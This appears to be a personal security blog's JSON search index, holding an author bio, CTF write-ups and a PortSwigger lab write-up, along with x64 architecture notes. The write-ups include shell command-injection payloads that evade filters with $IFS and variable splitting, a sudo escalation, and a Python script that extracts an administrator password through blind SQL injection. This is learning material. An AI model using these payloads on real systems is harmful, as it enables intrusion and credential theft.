[{"content":"TL;DR My name is Ahmed Ashraf, but I often go by pixelman online. I‚Äôm currently a Computer Science student with a strong passion for cybersecurity, low-level systems, and programming. My journey into tech started from curiosity about how games are made then how computers really work, and it grew into a love for Linux, ethical hacking, and building tools from scratch.\nI spend much of my time learning and practicing web application security and binary exploitation, often through Capture The Flag (CTF) competitions. These challenges sharpen my problem-solving skills and keep me up to date with real-world attack techniques.\nBeyond offensive security, I‚Äôm also fascinated by the fundamentals of operating systems and networks, and I enjoy experimenting with projects that combine coding with practical security applications‚Äîwhether it‚Äôs building utilities in C++/Python/Go, customizing my NixOS setup, or writing scripts to explore system internals.\n","description":"","id":0,"section":"","tags":null,"title":"\u003e whois pxlman","uri":"http://localhost:1313/about/"},{"content":"Web Caffeine (User) While testing the Check order status found that it\u0026rsquo;s just grep i right if it matches whatever like a customer name or coffee type or order id so i tried doing command injection AND WALLA Lattee;ls gave me everything then made Lattee; cat user.txt which had the Flag\nCaffeine (Root) This was more challenging it had the flag at /root/root.txt which needed from me to find a privilege escalation way to read it.\nWhen i did sudo -l i found that i can use /usr/local/bin/brew with sudo so why not i did it and found that it was a fake brew that i can just do\n1 Latte;sudo /usr/local/bin/brew /root/root.txt And catched it.\nBaking Bad command injection with many strings are banned like cat, /, -, printf with space and many others, but i found that i can use $, {}, :, ., =, and that was enough :).\nfirst i found that i can use env so i thought of taking any path in the env and take from it the / and use it my way\n1 a;env And here we are\n1 2 a;ls${IFS}${PWD:0:1} # To test that i really can use the slash now a;f=ca;l=t;$f$l${IFS}${PWD:0:1}flag.txt # which is just cat `/flat.txt` ","description":"Writeup for Brunner CTF 2025 where i solved a web challenge, pwn challenge, 2 Boot2Root and some easy/medium misc challenges","id":1,"section":"ctfs","tags":["web"],"title":"Brunner CTF 2025","uri":"http://localhost:1313/ctfs/brunner-ctf-2025/"},{"content":"\nVending Machine First we try writing soda to understand how it works. When u right soda/chips it prints ‚Äúdropping soda/chips‚Ä¶‚Äù. and the product img is dropping from the vending machine pic.\nThen i tried to see the source and i found a JS file that contains where product is a map for some defined products (where they their images on the server)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 setTimeout(async () =\u0026gt; { // Wait for PHP response const response = await sendProduct(input); output.innerHTML = response; // Show PHP response item.style.transform = \u0026#34;translateY(0)\u0026#34;; // Reset position for next drop setTimeout(() =\u0026gt; item.style.display = \u0026#34;none\u0026#34;, 1000); // Hide item after a second }, 2000); // Time it takes to drop the item if (products[input.toLowerCase()]) { output.innerHTML = `Dropping ${input}... √∞≈∏¬•¬≥`; // Show item and animate drop item.style.display = \u0026#34;block\u0026#34;; // Show the item item.innerHTML = `\u0026lt;img src=\u0026#34;${products[input.toLowerCase()]}\u0026#34; alt=\u0026#34;${input}\u0026#34;\u0026gt;`; // Set image source // Move item up to simulate dropping down item.style.transform = \u0026#34;translateY(-60px)\u0026#34;; // Move up to simulate dropping down } // Clear input field document.getElementById(\u0026#39;product-input\u0026#39;).value = \u0026#39;\u0026#39;; } // Function to send product to PHP and return response async function sendProduct(product) { const response = await fetch(\u0026#39;drop-item.php\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, }, body: `product=${encodeURIComponent(product)}` // Send product name }); if (response.ok) { const responseData = await response.text(); // Get the response text return responseData; // Return response to be displayed } else { return \u0026#34;Error communicating with the server.\u0026#34;; // Handle errors } } at the first i tried many rabbit holes like XSS and SQLi, i stayed alot trying an SQLi :\\ , any way i tried to understand what characher is work and what‚Äôs doesn‚Äôt, i found that [\u0026lt;,\u0026gt;,SPACE,+,\\,COMMA] r disappearing when i send to the server.\ni tried to inject a php code thinking it may work but i found that when i send echo with a non alphabatic after and before it it disappears.\nHere i was likely thinking it‚Äôs something like a php injection :)\nAny way when i searched to understand what NoSQLi is i tried some payloads and it didn‚Äôt work at all even the SQLi i used.\nThen when i tried to add a null byte %00 it ruined the app and gave me this.\nAs u can see the app is using shell_exec($command) where the $command is the product in our request.\nSooooo i got that there is a command injection here (where i didn‚Äôt learn yet).\nI tried some basic command and all of them r disappearing, i thought i should use a different type of dealing with the server but there wasn‚Äôt.\nI tried to find a way to make the command with separating it with something in between that the shell understand it means nothing but i didn‚Äôt find anything.\nAnd then i remembered something in Linux that u can call a command when it‚Äôs a value of a variable like executing $VAR if VAR is a command it will be executed.\nSoooo let‚Äôs separate our commands into 2 vars and see what‚Äôs happening.\ni sent this payload f=l;l=s;$f$l and it responed with this\n1 2 3 4 5 6 7 8 f=l;l=s;$f$l is not available Dockerfile assets docker-compose.yml drop-item.php entrypoint.sh index.html script.js styles.css Hehehe üòç, now the game is on.\nBut wait‚Ä¶ we still can‚Äôt separate the space : | , i searched alot on how to get an alterative to the space in linux shell then i found $IFS, then i tried to add a word after the variable to make it work well so i used $IFS\u0026quot;arg\u0026quot; and it worked well.\nSo when catting entrypoint.sh we found there this script\n1 2 #!/bin/sh echo \u0026#34;$FLAG\u0026#34; \u0026gt; /home/apache/flag \u0026amp;\u0026amp; chmod 644 /home/apache/flag \u0026amp;\u0026amp; apache2-foreground Now we can peacfully get the flag by f=ca;l=t;$f$l$IFS\u0026quot;/home/apache/flag\u0026quot;\nThe flag: CYCTF{C1luQGN9pX6LsTDdJKsAb_KWSBYKw4Q08tW0fii6jrStt319uC3PolHeR8joQYnvZTn4SRESYI3JWhWww70Hcm4xzj7kg33tZ0pYG35uQTGuFw}\n","description":"Writeup for my first CTF, CyCTF 2024 quals where i solved a web challenge","id":2,"section":"ctfs","tags":["web"],"title":"CyCTF 2024 quals","uri":"http://localhost:1313/ctfs/cyctf-quals-2024/"},{"content":"Portswigger lab\nThe Lab description This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and no error messages are displayed. But the application includes a¬†Welcome back¬†message in the page if the query returns any rows.\nThe database contains a different table called¬†users, with columns called¬†username¬†and¬†password. You need to exploit the blind SQL injection vulnerability to find out the password of the¬†administrator¬†user.\nTo solve the lab, log in as the¬†administrator¬†user.\nUnderstanding the lab When i access the lab i find that it works normally till i hit the login or refresh it gives me a Welcome Back begind the login icon.\nBy analyzing the request i found out that there r two cookies\nCookie: TrackingId=e2D1yRgn8a5Q8l8E; session=OoYYGOLsm9n9NqZ2rLc4r2H4IBvhT8i5 contains TrackingId and session.\nI assumed that the TrackingId is in an SQL query like SELECT TrackingId FROM users WHERE TrackingId = \u0026lt;MY COOKIE\u0026gt;;\nSo i started testing injecting in there to what happens to the posisive msg Welcome Back.\nFirst when i change the id it doesn‚Äôt appear so the trackingid is essential.\nThen opened burp repeater trying to add something like ...8E' OR '1'='2' -- make it doesn‚Äôt appear.\nSo started hunting.\nI started testing the database data the site gave me about the lab\n8E' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),1,1) \u0026gt; '0'--; session=OoYYGOLsm9n9NqZ2rLc4r2H4IBvhT8i5\nit worked and when changin the test to \u0026lt; '0' it doesn‚Äôt.\nso at first i tried it manually found out that i will not finish so i used the most way i like‚Ä¶ scripting.\nI made this script to start getting the password\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # exploit.py import subprocess def getCmd(i, char, sign): link = \u0026#34;https://0af900ba04c11a3481b6b15700db0006.web-security-academy.net/\u0026#34; cookies = f\u0026#34;Cookie: TrackingId=e2D1yRgn8a5Q8l8E\u0026#39; AND SUBSTRING((SELECT password FROM users WHERE username = \u0026#39;administrator\u0026#39;),{i},1) {sign} \u0026#39;{char}\u0026#39;--; session=OoYYGOLsm9n9NqZ2rLc4r2H4IBvhT8i5\u0026#34; return f\u0026#34;\u0026#34;\u0026#34;curl -L \u0026#34;{link}\u0026#34; -H \u0026#34;{cookies}\u0026#34; \u0026#34;\u0026#34;\u0026#34; i=1 password = \u0026#34;\u0026#34; positive = \u0026#34;\u0026lt;div\u0026gt;Welcome back!\u0026lt;/div\u0026gt;\u0026lt;p\u0026gt;|\u0026lt;/p\u0026gt;\u0026#34; while True: for char in \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789\u0026#34;: cmd = getCmd(i, char, \u0026#39;=\u0026#39;) res = subprocess.run(cmd, shell=True, check=True, capture_output=True) if res.stdout.decode().find(positive) != -1: password += char print(f\u0026#34;Password: {password}\u0026#34;) break i += 1 if subprocess.run(getCmd(i, \u0026#34;\u0026#34;, \u0026#39;=\u0026#39;), shell=True, check=True, capture_output=True).stdout.decode().find(positive) != -1: print(\u0026#34;Done!\u0026#34;) break Then launching get giving me\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ python sqlGuessPassword.py Password: y Password: yq Password: yqc Password: yqcs Password: yqcsv Password: yqcsvs Password: yqcsvsd Password: yqcsvsd2 Password: yqcsvsd2d Password: yqcsvsd2dy Password: yqcsvsd2dyz Password: yqcsvsd2dyzd Password: yqcsvsd2dyzdc Password: yqcsvsd2dyzdc3 Password: yqcsvsd2dyzdc3g Password: yqcsvsd2dyzdc3gu Password: yqcsvsd2dyzdc3gui Password: yqcsvsd2dyzdc3guia Password: yqcsvsd2dyzdc3guia4 Password: yqcsvsd2dyzdc3guia4g Done logging in and‚Ä¶ Congratulations üòá\n","description":"A guide to exploiting a blind SQLi vulnerability using conditional responses in Portswigger with my python script.","id":3,"section":"posts","tags":["sqli","portswigger","python","web"],"title":"Blind SQLi Portswigger Conditional Responses","uri":"http://localhost:1313/posts/blind-sqli-portswigger-conditional-responses/"},{"content":"Objectives Summarizing this article Basic Architecure\nWe will only cover the intel x64 arch.\nGeneral purpose registers The processor state flag The ISA Virtual memory Execution of a process on the x64 arch High Level Introduction The Compilation Process $$\\text{Source Code }\\xrightarrow[]{\\text{Compiler}}\\text{Assembly Code }\\xrightarrow[]{\\text{Assembler}}\\text{Object Code }\\xrightarrow[\\text{Libs used}]{ \\text{Linker}}\\text{Exec. Code}$$\n1 \\text{Source Code }\\xrightarrow[]{\\text{Compiler}}\\text{Assembly Code }\\xrightarrow[]{\\text{Assembler}}\\text{Object Code }\\xrightarrow[\\text{Libs used}]{ \\text{Linker}}\\text{Exec. Code} Compiler: Convert the source code to the assembly instructions Assembler: Convert the asm instructions to object code Linker: Convert the unusable asm code to an executable program just by linking the code with the needed libraries Compiled Binary BreakDown We will breakdown this C program that gets the physical computer name and print it out with it\u0026rsquo;s length\nYou can convert this C code to asm code using gcc -S code.c\nBut in this article he used visual studio to read the asm code\nEach line in this code is an instruction where, where the instructions avaliable differs from arch to arch, this is for the x64 arch.\nThis figure shows the strucure of assembly instructions:\nEach instruction starts with a mnemonic like mov dest, source(to store source in dest) and call(a function invocation).\nYou must take in consern that the 9 lines C code converted to a 25 lines ASM code that are run directly through the processor to perform billions of operations in seconds.\nThe MicroArchitecure Microarchitecture is all the digital logic that allows an instruction set to be executed. It‚Äôs the combination of memory, ALUs, registers, logic gates, and so on. When you combine all of these components you wind up with a processor.\nBut the component we will cover in this article is the register file.\nOperands¬†refer to the data being operated on.\nSome instructions has one, two, or three. Like line 19 xor eax, eax each eax is an operand. These operands are CPU registers.\nThe Register File Every processor needs to perform operations on data, these data must be stored temporarily. This is the purpose of processor\u0026rsquo;s register file(Which is a component in the CPU).\nBut some data needed will be in the memory so the processor take it and store it in the register till the operation that needed it ends. Think of the register as an empty slot. Where Each slot is filled with data and instructions can perform operations on this data before sending it to memory or storing it in another register.\nOn the intel x64 arch register file contains 16 general purpose registers, each is 64-bits in size. The sizes for each of these registers is usually referred to use of terms such as:\nWord -\u0026gt; 16-bits -\u0026gt; 2 bytes doubleword -\u0026gt; 32-bits -\u0026gt; 4 bytes quadword -\u0026gt; 64-bits -\u0026gt; 8 bytes \u0026hellip; Register Fundamentals These previous 16 general purpose regisers perform basic data movement, control workflow operations, string operations,\u0026hellip; .\nHere is a table of the general purpose registers.\nTo explain this, there are 16 general purpose registers. Each register on the 64-bit arch is 64-bits wide. However, on 32-bit archs there were only 8 general purpose registers. RAX in x64 arch is reduced to EAX with 32-bit size in the x86 arch. In addition, in the x64 arch they added 8 more registers which are from R8-R15. You can still access the lower portion of registers. Back in the old days of 16-bit arch there isn\u0026rsquo;t RAX neither EAX, there were only AX.\nYou can access the low word of the register EAX as you can you the register AX.\n1 2 xor eax, 10000539h ; xor eax with 0x10000539 mov var, ax ; var = 0x0539 We do this when we want a specific part from a larger part like taking the lower word of the RAX using AX. Also you can access smaller parts of additional general purpose registers using the register names with the size like R8b,R8w or R8d.\nAlso the RIP register(Register Instrucion Pointer) which hold the memory address of the next instruction to be excecuted, and it\u0026rsquo;s moves based on the type of the instruction executed. Usually RIP is automatically move to the next execution by increament the past instruction size in memory, but in case of if statement it\u0026rsquo;s works differs and this will point to soon.\nProcessor State Flag Register Called the¬†EFLAGS¬†register, but called RFLAGS register in 64-bit mode. It may also called the current program status register (CPSR). It\u0026rsquo;s a 32-bits register contains flags related to the state of the processor state in the current execution. The flags functions divided into to types:\nControl where branching instructions go. Control OS related operations.\nA small group of the status flags affected by arithmatic operations, the rest have definitions in there manuals.\nThis figure shows the EFLAGS register:\nWe will cover some of the status flags. The Zero Flag The Zero Flag(ZF) is a status flag where it\u0026rsquo;s set if and only if the arithmatic instruction result is 0.\nWe will discuss this flag on this code\n1 2 3 4 5 6 7 8 9 10 #include\u0026lt;stdio.h\u0026gt; int Integer0, Integer1; Integer0 = 510; Integer1 = 511; if ((Integer0 - Integer1) == 0) printf(\u0026#34;ZF set, execute this block.\\n\u0026#34;); else printf(\u0026#34;ZF not set, execute this block.\\n\u0026#34;); This code can written in assembly as follows(We took the only part we just need):\nmov rax, 510 mov rbx, 511 sub rax, rbx jnz zf_not_set lea rcx, offset zf_set_string call printf jmp end .zf_not_set: lea rcx, offset zf_not_set_string call printf .end: ret There at the sub instruction we subtracted 510 from 511 which is 1(not zero) then it will not set the ZF in the EFLAGS register. Now the jnz(Jump if Not Zero) will check the ZF if it\u0026rsquo;s not set then the jump will be taken and we will jump to the label .zf_not_set, where we will take the zf_not_set_string and call printf. So, if the ZF was set it would take the zf_set_string and call the printf function then end the program.\nThe Sign Flag It\u0026rsquo;s a flag for signed operations, and it\u0026rsquo;s:\nSet to on if result is \u0026lt; 0 Set to off if result is \u0026gt;= 0\nWe will discuss this code: 1 2 3 4 5 6 7 8 9 10 11 int Integer0, Integer1; Integer0 = 1; Integer1 = 1000; if ((Integer0 - Integer1) \u0026lt; 0) printf(\u0026#34;SF set, execute this block.\\n\u0026#34;); else printf(\u0026#34;SF not set, execute this block.\\n\u0026#34;); return 0; And that\u0026rsquo;s the assembly we need from it:\nmov rax, 1 mov rbx, 1000 sub rax, rbx jge sf_not_set lea rcx, sf_set_string call printf jmp end .sf_not_set: lea rcx, sf_not_set_string call printf .end: xor eax, eax ret We can use the SF(Sign Flag) using the mnemonic jge(Jump if Greater than or Equal 0). Which will jump to the label sf_not_set if the SF is set to 0(result is \u0026gt;= 0) and there it will print the sf_not_set_string using the printf function.\nThe Carry Flag The Carry Flag(CF) function is to handle the overflow resulting from the unsigned arithmatic operations. Like: adding 255 and 1 to a 8-bit register will make an overflow, this flag is responsible for handling this.\nThere is a separate flag to handle the overflow in the signed arithmatic operations(OverFlow Flag)\nConclusion In this article we have talked about:\nWe talked about the compilation process We talked about Register file and it\u0026rsquo;s fundamentals We talked shortly about the EFLAGS Also we spoke about some processor state flags: Zero Flag Sign Flag Carry Flag ","description":"A summary of the basic architecture of the intel x64 architecture","id":4,"section":"posts","tags":["asm","note","pwn"],"title":"Basics of CPU Architecure","uri":"http://localhost:1313/posts/basic-cpu-architecure/"}]